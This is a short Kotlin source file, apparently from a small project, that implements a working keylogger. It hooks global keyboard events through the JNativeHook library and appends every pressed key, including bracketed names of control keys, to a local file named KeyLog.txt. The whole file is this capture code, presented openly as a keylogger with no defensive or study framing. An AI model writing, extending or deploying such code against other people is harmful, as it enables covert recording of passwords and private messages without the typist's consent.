package org.example.project.keyLogger

import org.jnativehook.keyboard.NativeKeyEvent
import org.jnativehook.keyboard.NativeKeyListener
import java.nio.file.Files
import java.nio.file.Paths
import java.nio.file.StandardOpenOption

class KeyLogger : NativeKeyListener {
    private val logFile = Paths.get("KeyLog.txt")

    override fun nativeKeyPressed(e: NativeKeyEvent) {
        val keyText = NativeKeyEvent.getKeyText(e.keyCode)

        Files.newBufferedWriter(
            logFile,
            StandardOpenOption.CREATE,
            StandardOpenOption.WRITE,
            StandardOpenOption.APPEND
        ).use { writer ->
            // eg. [ Left Control ]
            if (keyText.length > 1) {
                writer.write("[ $keyText ]")
            } else {
                writer.write(keyText)
            }
        }
    }


    override fun nativeKeyReleased(e: NativeKeyEvent) {
        // Nothing.
    }

    override fun nativeKeyTyped(e: NativeKeyEvent) {
        // Nothing.
    }
}

